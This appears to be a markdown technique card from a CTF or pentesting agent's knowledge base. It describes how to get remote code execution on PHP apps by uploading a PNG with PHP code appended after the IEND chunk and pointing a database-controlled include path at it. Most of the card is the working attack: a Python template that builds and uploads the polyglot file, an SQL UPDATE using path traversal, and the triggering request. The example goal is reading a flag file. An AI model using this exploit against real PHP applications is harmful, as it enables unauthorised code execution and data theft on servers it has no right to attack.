---
name: polyglot_png_php_include_rce
vuln_type: lfi
sub_technique: polyglot_file_rce
category: exploitation
safety_level: safe
---

# Polyglot Png With Appended Php Code + Lfi Via Include With Db-Controlled Path

## When to Apply

A PHP app has an `include $path;` statement where $path comes from a database column, and the attacker can modify that column (via SQL injection or direct DB access). A file upload endpoint validates images via exif_imagetype() / getimagesize() but does not strip data after the PNG IEND marker. By appending `<?php ... ?>` after the IEND chunk, the file passes image validation while containing executable PHP. Setting the DB path to point to the uploaded image triggers PHP execution on include.

## Prerequisites

- PHP `include $path;` where $path is read from a DB column
- Attacker can modify the DB column (SQLi, direct DB access, or admin feature)
- File upload validates image type (exif_imagetype, getimagesize) but does not re-encode
- short_open_tag = Off (PHP 8.x default) to avoid `<?` in PNG binary triggering parse errors
- No open_basedir restriction blocking the uploaded image path

## Steps

1. Create minimal valid PNG (e.g., 1x1 pixel): PNG signature + IHDR + IDAT + IEND
2. Append PHP payload after IEND: `<?php echo file_get_contents('/flag_path'); ?>`
3. Upload the polyglot PNG via the image upload endpoint
4. Capture the server-assigned filename (e.g., sha256(random).png)
5. Modify the DB to set the include path to the uploaded image:
   UPDATE product SET product_cache = '../image/{hash}.png' WHERE pid = N;
6. Trigger the include via the product card endpoint:
   GET /product_card.php?pid=N&cache=../image/{hash}.png
7. PHP outputs PNG binary (garbage) then executes appended PHP → flag in response

## Code Template

```
import struct, zlib, io, requests, mysql.connector

# 1. Build polyglot PNG+PHP
def make_png_php(php_code):
    sig = b'\x89PNG\r\n\x1a\n'
    def chunk(t, d): c=t+d; return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xFFFFFFFF)
    ihdr = struct.pack('>IIBBBBB',1,1,8,2,0,0,0)
    raw = b'\x00\xff\x00\x00'
    return sig + chunk(b'IHDR',ihdr) + chunk(b'IDAT',zlib.compress(raw)) + chunk(b'IEND',b'') + php_code.encode()

png = make_png_php('<?php echo file_get_contents("{flag_path}"); ?>')
# 2. Upload
resp = requests.post('{url}/upload', files={{'image': ('e.png', io.BytesIO(png), 'image/png')}})
# 3. Parse filename, 4. Update DB, 5. Trigger include
```

## Examples

### Example 1

- **upload_endpoint**: POST /ymp_internal/upload_action.php
- **include_endpoint**: GET /ymp_internal/product_card.php?pid=N&cache=PATH
- **db_column**: product.product_cache
- **image_validation**: exif_imagetype() + getimagesize() + extension allowlist (jpg/png)
- **flag_path**: /flag_*.txt

PNG IEND marks the end of image data — anything after it is ignored by image parsers but is processed by PHP's include. The DB path uses relative traversal (../image/) to reach the uploaded file from the include's working directory.
